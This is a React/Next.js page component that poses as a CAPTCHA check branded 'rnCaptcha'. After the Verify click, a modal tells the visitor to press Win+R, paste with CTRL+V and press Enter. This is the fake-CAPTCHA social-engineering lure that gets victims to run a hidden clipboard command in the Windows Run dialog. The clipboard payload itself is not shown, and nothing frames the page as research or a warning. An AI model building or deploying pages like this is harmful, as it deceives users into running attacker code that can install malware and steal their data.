import Head from "next/head";
import { useState } from "react";

export default function Main() {
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleVerifyClick = () => {
    setIsModalOpen(true);
  };

  const handleCloseClick = () => {
    setIsModalOpen(false);
  };

  return (
    <div className="container">
      <Head>
        <title>Verification Required</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        {!isModalOpen && (
          <div className="verification-box">
            <h1>Verification Required</h1>
            <p>To proceed, follow these steps to verify that you are not a robot:</p>
            <button className="verify-button" onClick={handleVerifyClick}>
              Verify
            </button>
            <p className="powered-by">Powered by rnCaptcha</p>
          </div>
        )}

        {isModalOpen && (
          <div className="modal-overlay">
            <div className="modal">
              <h2>Waiting for Verification...</h2>
              <p>Please follow these steps:</p>
              <ol>
                <li>Press <strong>Win + R</strong> on your keyboard.</li>
                <li>Press <strong>CTRL + V</strong> to paste the verification code.</li>
                <li>Press <strong>Enter</strong>.</li>
              </ol>
              <button className="close-button" onClick={handleCloseClick}>
                Close
              </button>
            </div>
          </div>
        )}
      </main>

      <style jsx>{`
        /* Include your existing styles here */
      `}</style>
    </div>
  );
}
